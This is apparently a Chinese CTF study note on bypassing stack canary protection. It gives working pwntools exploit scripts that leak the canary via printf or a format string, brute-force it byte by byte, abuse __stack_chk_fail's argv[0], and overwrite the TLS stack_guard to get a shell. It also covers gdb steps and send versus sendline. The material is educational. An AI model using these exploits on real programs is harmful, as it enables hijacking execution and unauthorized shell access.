DATE 2026-07-04

SUMMARY 详细讲解了canary的保护机制及绕过方法，同时介绍了send和sendline的使用场景

TAG canary

TITLE Canary保护机制介绍


# Canary保护机制介绍
- 现在都还是系统安全的第一道防线

> [!TIP]
> Canary 和 Windows 下的 GS 保护 都是防止栈溢出的有效手段，
> 也是Linux标配的保护机制

- 在程序开启 Canary 保护后，**在函数** 开始的部分 会取 fs 寄存器 0x28 处（32位系统为fs:0x14）
  存放在 rbp - 0x8（32位 为 ebp - 0x4）（在实际中会有区别，具体在IDA中可看到）
  具体操作代码：
```python
mov rax, qword ptr fs:[0x28]
mov qword ptr [rbp - 8], rax
```

在函数返回之前，会将该值取出，与fs:0x28的值进行异或，若为0，则未被修改，函数正常返回

![[Pasted image 20260209212102.png]]


# Canary保护机制绕过：泄露Canary值（leak_canary）

## 方法1：正常打印函数泄露Canary

```python
from pwn import *

context(arch='i386', os='linux')

p = process('./leak_canary')

target = 0x080485CC

p1 = b'a' * 0x100 + b'b'
p.send(p1)

p.recvuntil(b'a' * 0x100)
leak_info = u32(p.recv(4))

canary = leak_info - ord('b')

p2 = b'\x00' * 0x100 + p32(canary)
p2 += p32(0) * 3
p2 += p32(target)

p.send(p2)

p.interactive()
```
- 先利用fmt泄露canary值，再栈溢出覆盖返回地址

- **栈结构分析**：`vulnfunc`中`buf`大小为 256 字节（`0x100`），Canary 存储在`buf`之后（偏移`0x100`），且 Canary 的最低字节固定为`0x00`（防止字符串泄露）。
- **覆盖 Canary 最低字节**：`p1`发送 256 个`a`填满`buf`，再用`b`（`0x62`）覆盖 Canary 的最低字节（从`0x00`改为`0x62`）。
- **普通打印函数泄露**：第一次`printf(buf)`会从`buf`开始打印，直到遇到`\0`。由于 Canary 最低字节被改为`0x62`，`printf`会继续打印 Canary 的高 3 个字节，共 4 字节（`0x62 + Canary高3字节`）。
- **计算原始 Canary**：`u32`将泄露的 4 字节解析为 32 位整数，减去`ord('b')`（`0x62`），即可还原出原始 Canary 值（最低字节恢复为`0x00`）。

---
![[Pasted image 20260209213421.png]]
![[Pasted image 20260209213532.png]]


- **恢复 Canary**：用`\x00`填满`buf`，再写入原始 Canary 值，确保 Canary 检查通过。
- **填充栈帧**：`p32(0) * 3`填充栈上的`ebp`等冗余数据，确保返回地址的位置正确。
- **覆盖返回地址**：将返回地址替换为`target`函数的地址，使`vulnfunc`返回时跳转到`target`。
- **交互 shell**：发送 Payload 后，程序执行`target`函数，调用`system("/bin/sh")`，进入交互模式获取 shell。
（这里的 3 是因为，覆盖到ebp是0x10C，即为268，而buf是256，相差12，由于Canary在buf之后，所以为了确保正确覆盖返回地址，此外，由于canary本身占了4个字节，所以加上ebp，总共需要覆盖3个32位字节，即可覆盖至ebp）
![[Pasted image 20260209213736.png]]
32位canary结构：从低地址到高地址，canary有四个字节，即 x x x \x00，末尾字节为\x00，在栈中存储的时候是\x00在高地址，所以这也就说明了为什么在canary末尾加一个\x00可以防止泄露。

而覆盖为 b 时，由于\x00被修改了，所以可以打出剩下的三个字节，达到泄露的目的。


## 方法二：格式化字符串泄露Canary

```python
from pwn import *

context(arch='i386', os='linux')

p = process('./leak_canary')

target = 0x080485CC

p1 = "%{}$p\n".format(0x48 - 1)
p.send(p1)
leak_info = p.recvuntil("\n", drop=True)
canary = int(leak_info, 16)

p2 = b'\x00' * 0x100 + p32(canary)
p2 += p32(0) * 3
p2 += p32(target)

p.send(p2)

p.interactive()
```

你在实际渗透 / 解题中，核心是**先判断 Canary 的泄露形式**—— 是「原始二进制字节」还是「十六进制文本字符串」，再对应选择解析方式。我给你一套可直接套用的判断逻辑和实操方法：

### 一、核心判断原则（两步走）

#### 1. 第一步：看「泄露手段」（最直接）

不同泄露方式决定了输出的内容形态，对应关系如下：

| 泄露手段               | 输出形态    | 解析方式                 |
| ------------------ | ------- | -------------------- |
| 栈溢出 +`printf(buf)` | 原始二进制字节 | `u32()`/`u64()`（按位数） |
| 格式化字符串`%p`         | 十六进制文本  | `int(leak, 16)`      |
| 格式化字符串`%x`         | 十六进制文本  | `int(leak, 16)`      |
| 程序日志 / 报错输出 Canary | 十六进制文本  | `int(leak, 16)`      |

#### 2. 第二步：实操验证（不确定时必做）

如果不确定形态，先打印泄露的原始数据，看一眼就清楚：

python

运行

```
# 拿到泄露的bytes后，先打印查看
leak = p.recv(4)  # 或 p.recvuntil("\n")
print("原始bytes：", leak)
print("是否为可读文本：", leak.isprintable())
```

- 若输出是 `b'\xbe\xad\xde\x00'`（乱码、`isprintable()`返回 False）→ 用`u32()`；
- 若输出是 `b'0xdeadbe00'`/`b'deadbe00'`（可读、`isprintable()`返回 True）→ 用`int(leak, 16)`。

### 二、补充：特殊情况处理

如果遇到 `%p` 输出少了`0x`前缀（比如`b'deadbe00'`），`int(leak, 16)` 依然有效 ——Python 的`int`函数可以自动识别无前缀的十六进制字符串。

### 总结

1. 先看泄露手段：`printf(buf)`→二进制→`u32()`；`%p/%x`→文本→`int(...,16)`；
2. 不确定就打印泄露的`bytes`，看是否可读：乱码用`u32()`，可读文本用`int()`；
3. 核心逻辑：解析方式要匹配「数据的实际形态」，而非仅看`bytes`类型。

### 0x48 - 1数值的确定：
- 0x48是canary的栈偏移，减去1是因为，格式化字符串%N$p的序号从1开始，所以要减去1。
- 找偏移的方法：
1. 用爆破法遍历栈位置，找到Canary
2. 若某输出结果的值是0x????且最后1字节是00，就是Canary
### 为确保canary被找到，可以扩大范围与单次寻找
代码：
```python
for i in range(1, 100):
    try:
        p.send(f'%{i}$p\n'.encode())
        res = p.recvline().strip()
        if res and b'(.nil)' not in res and b'00' in res[-2:]:
            print(i)
            print(res)
    except EOFError:
        p = process('./leak_canary')
        continue
```
打印出来有几个是满足条件的。可以一一排查，先构造payload，查看是否会报错


# Canary保护机制绕过：逐个字节爆破Canary值（one_by_one_bruteforce）

- 每次进程重启后的 Canary 不同、同一进程每个线程的 Canary 也不同
- 在CTF中，有通过 fork 函数开启子进程交互的题目，因为fork函数会直接拷贝父进程的内存，所以每次创建的子进程Canary是相同的

![[Pasted image 20260210152039.png]]

根据源代码，第一个read处可以循环输入，可以用来爆破canary，然后准备好了就可以输入 'y' 进行 go

go这里可以开始栈溢出

> [!TIP]
> C库函数 wait 用于父进程等待它的子进程终止，并回收子进程的资源（避免僵尸进程），同时获取子进程的退出状态。
> 父进程调用wait()后会阻塞，直到某个子进程结束，才会继续执行

于是可以在循环那里直接暴力破解：
```python
from pwn import *

context(arch='amd64', os='linux')
# context.log_level='debug'

p = process('./bru')

know_canary = b''

for i in range(8):
    print(i)
    for j in range(256):
        try:
            p.recvuntil(b'one_by_one_bruteforce\n')
            p2 = b'a' * 0x108 + know_canary
            p2 += chr(j).encode()
            p.send(p2)
            res = p.recvline()
            if b'*** stack smashing detected ***' not in res:
                know_canary += chr(j).encode()
                p.send(b'junk')
                if i == 7:
                    p.recvuntil(b'are you ready?\n')
                    p.send(b'y')
                    print(56)
                    break
                p.recvuntil(b'are you ready?\n')
                p.send(b'n')
                break
            p.recvuntil(b'are you ready?\n')
            p.send(b'n')
        except:
            print('wrong')
            break

p.recvuntil(b'go\n')

p2 = b'a' * 264 + know_canary + p64(0) + p64(0x040083E)
p.send(p2)
print()

p.interactive()
```

```python

```


# Canary保护机制绕过：stack_smashes，__stack_chk_fail覆盖参数__libc_argv\[0]
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

p = process('./stack_smashes')

# gdb.attach(p, 'b* 0x040087A')
flag_addr = 0x601090

p2 = b'a' * 0x218 + p64(flag_addr)

p.sendafter(b'stack_smashes\n', p2)
p.recv()

p.interactive()
```
这里的确定方法：stack 100，找到地址distance即可


# Canary保护机制绕过：覆盖stack_guard的值

- 前情剖析：
1. 函数vulnfunc中创建了一个线程，执行thr_fn
2. 而线程函数 thr_fn 存在栈溢出
3. 整个线程栈上有两个canary检查点：一个在thr_fn栈帧末尾，一个在整个线程栈末尾

- exp思路：
1. 先填充到thr_fn栈帧中canary的位置
2. 覆盖线程函数栈帧上的canary，让检查通过
3. 覆盖栈基址rbp
4. 覆盖返回地址，劫持执行流
5. 扩展payload，到达线程栈末尾canary位置
6. 再次覆盖线程栈末尾的canary

- 解释：
1. TLS（线程本地存储）位于线程栈的底部（高地址），而栈向低地址增长。
2. 向buf写入大量数据时，会先覆盖thr_fn的栈帧（包括局部canary）
3. 继续向上覆盖，最终到达线程栈底部的TLS区域
4. **第一次覆盖** 是覆盖 thr_fn 栈帧中的局部canary
5. **第二次覆盖** 是覆盖TLS中的stack_guard

- 数值调试：
1. set follow-fork-mode child
2. **当程序调用`fork()`创建新进程时，调试新创建的子进程，而不是继续调试父进程**
3. info threads，找到fs的具体指向，即tcbhead_t的地址。
4. **fs寄存器指向TLS（线程本地存储）的起始地址，也就是tcbhead_t结构体的地址**
   介绍：在glibc中，TLS开头是tcbhead_t结构体。

payload解释：
1. buf数组大小为0x108，先填充到这里，然后canary覆盖。接着覆盖thr_fn返回地址为target
2. 由于子线程canary被修改，所以要修改外部的canary，即stack_guard
3. buf那里有一个canary，而子进程的栈底的0x28偏移处通常是stack_guard的存储地址
   （linux amd64）glibc版本也会影响
4. 通过调试找到buf的起始地址与子进程thr_fn的栈底地址
   ![[Pasted image 20260216144757.png]]
5. （b thr_fn）不难看出，线程2的基址为0x7ffff77ef700，而buf的地址则为rbp - 0x110（IDA中可看出），用distance算一下距离即可得到具体溢出长度（注意要加上0x28才是stack_guard的地址【linux amd64】）

因为**编译器和操作系统约定好了**：

- **编译器**生成代码时写死：从`fs:[0x28]`取canary
- **操作系统**初始化线程时写死：把canary放在`fs:[0x28]`

就像你家门牌号是固定的，邮递员知道往那送信，你也知道信在那等着。`fs:[0x28]`就是这个固定门牌号。
所以，
```zsh
# 1. 先确认当前线程
info threads
thread 2  # 确保在线程2

# 2. 找到buf地址
disassemble thr_fn
# 看到类似：
# 0x40093a <thr_fn+6> sub rsp, 0x110
# 0x40094a <thr_fn+22> lea rax, [rbp-0x110]  # buf地址

# 3. 查看实际地址
p/x $rbp - 0x110  # buf_addr

# 4. 找到TLS中的stack_guard
p/x (void *)__readfsqword(0x28)  # stack_guard值
p/x $fs_base  # TLS基址
x/gx $fs_base + 0x28  # stack_guard位置

# 5. 计算偏移
# buf_addr 到 TLS中stack_guard的距离
p/x ($fs_base + 0x28) - ($rbp - 0x110)  # 这就是你需要的0x8e8

# 6. 验证
# 可以发送pattern确认
```

---
exp:
```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'

p = process('./g')

p.recvuntil(b'change the origin stack guard\n')

target = 0x40090E
my_canary = 0xdeadbeafdeadbeef

p2 = b'a' * 0x108 + p64(my_canary) + p64(0) + p64(target)
p2 = p2.ljust(0x8e8, b'\x00')
p2 += p64(my_canary)

p.send(p2)

p.interactive()
```


# Send和Sendline的使用场景

#### 需要用`sendline`的输入函数（依赖`\n`结束输入）

这类函数会一直等待输入，直到读取到`\n`才停止，是最常见的场景：

- `scanf("%s", buf)`：经典的格式化输入，必须用`\n`结束输入；
- `gets(buf)`：读取一行输入，以`\n`为终止符（且会丢弃`\n`）；
- `fgets(buf, size, stdin)`：读取一行，以`\n`为终止符（会保留`\n`在 buf 中）；
- 命令行交互程序（比如提示`"input: "`后等待输入）：通常按回车（`\n`）提交输入。

---
#### 需要用`send`的输入函数（不依赖`\n`，精确控制输入）

这类函数按 “指定长度” 或 “流结束” 读取输入，不需要`\n`，加了反而会污染输入内容：

- `read(0, buf, n)`：从标准输入读取`n`字节，不管是否有`\n`，读满 n 字节就停止；
- `recv()`（网络程序）：按字节数读取，无换行符逻辑；
- 栈溢出 / Canary 爆破：需要精确覆盖栈地址，输入中不能有多余的`\n`（否则偏移错位）。

---
#### 1. 栈溢出 Payload 绝对用`send`，而非`sendline`

栈溢出需要精确的字节数覆盖栈地址，`sendline`自动加的`\n`会让 Payload 多出 1 字节，直接导致偏移错位（比如你之前的`stack_smashes`如果用`sendline`，`0x218`偏移会变成`0x219`，覆盖 Canary）：

python

运行

```python
# 错误（栈溢出）
p.sendline(b"A"*0x218 + p64(flag_addr))  # 多了\n，偏移错位
# 正确
p.send(b"A"*0x218 + p64(flag_addr))     # 无多余字节，偏移精准
```

#### 2. 不确定时用`debug`日志验证

开启`context.log_level='debug'`，查看发送的原始内容：

python

运行

```python
context(log_level='debug')
p.send(b"test")  # 日志显示Sent 0x4 bytes: b'test'
p.sendline(b"test")  # 日志显示Sent 0x5 bytes: b'test\n'
```

#### 3. 手动加`\n`替代`sendline`（更可控）

如果需要加`\n`但不想用`sendline`（比如`data`本身有`\n`），直接手动拼接：

python

运行

```python
# 等价于sendline，但更可控
p.send(b"abc" + b"\n")
# 避免：sendline(b"abc\n") → 发送b"abc\n\n"，多出换行
```

### 总结

1. **核心规则**：程序输入需要`\n`触发结束（scanf/gets）→ `sendline`；需要精确字节数（read / 栈溢出）→ `send`；
2. **避坑关键**：栈溢出 Payload 必须用`send`，避免`sendline`的多余`\n`导致偏移错位；
3. **验证方法**：开启 debug 日志，检查发送的字节数和内容是否符合预期；